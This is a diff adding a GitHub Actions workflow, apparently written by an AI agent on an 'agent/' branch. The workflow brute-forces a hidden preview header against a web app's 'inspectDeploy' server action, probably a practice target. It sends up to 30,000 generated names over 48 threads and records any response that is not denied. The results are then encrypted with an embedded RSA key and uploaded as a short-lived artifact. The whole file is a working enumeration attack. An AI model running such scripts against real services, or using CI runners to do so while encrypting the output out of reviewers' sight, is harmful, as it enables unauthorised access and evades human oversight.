@@ -1,0 +1,93 @@
+name: launchlet-part2-context-enum
+
+on:
+  push:
+    branches: [agent/launchlet-part2-context-enum-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Enumerate structured preview context names and encrypt hits
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,pathlib,urllib.parse,json,itertools,concurrent.futures
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
+          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          baseh={'Accept':'application/json','Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
+          public=boot['project']
+          words=['demo','board','release','pulse','production','readiness','enterprise','rollout','final','review','preview','deploy','deployment','internal','corporate','corp','admin','ops','operator','staging','stage','prod','product','publish','publisher','artifact','artifacts','control','plane','studio','team','releasepulse','release-pulse','production-readiness','enterprise-rollout','final-review','launch','live','candidate','rc3','2026']
+          cands={public}
+          # Most likely Launchlet project names: launchlet-<1..3 semantic parts>
+          atoms=words
+          for n in [1,2,3]:
+            for tup in itertools.product(atoms, repeat=n):
+              # prune duplicate adjacent words and nonsensical all numeric
+              if any(tup[i]==tup[i+1] for i in range(len(tup)-1)): continue
+              joined='-'.join(tup)
+              cands.add('launchlet-'+joined)
+              if n<=2:
+                cands.add(joined)
+                cands.add('project-'+joined)
+          # Variants around known public project and UI phrases.
+          bases=[public,'launchlet-demo','launchlet-release-pulse','launchlet-production-readiness','launchlet-enterprise-rollout','launchlet-final-review','release-pulse','production-readiness','enterprise-rollout','final-review']
+          tails=['release','deploy','prod','production','enterprise','internal','staging','final','review','admin','ops','2026','rc3','v1','v2','private','corp','corporate']
+          for b,t in itertools.product(bases,tails):
+            cands.add(b+'-'+t); cands.add(t+'-'+b)
+          # compact variants
+          extra=list(cands)
+          for c in extra[:5000]:
+            cands.add(c.replace('-','_'))
+          cands.discard(public)
+          # cap workload: prioritize launchlet names and UI-derived phrases, then others deterministically
+          ordered=sorted(cands,key=lambda x:(0 if x.startswith('launchlet-') else 1,len(x),x))[:30000]
+          def probe(v):
+            try:
+              r=requests.post(url,headers={**baseh,'X-Launchlet-Preview':v},json=body,timeout=4,allow_redirects=False)
+              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
+                return {'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+            except Exception: pass
+          hits=[]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=48) as ex:
+            for x in ex.map(probe,ordered,chunksize=20):
+              if x: hits.append(x)
+          (out/'summary.json').write_text(json.dumps({'candidate_count':len(ordered),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
+          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part2-context-enum-encrypted
+          path: artifact/
+          retention-days: 1
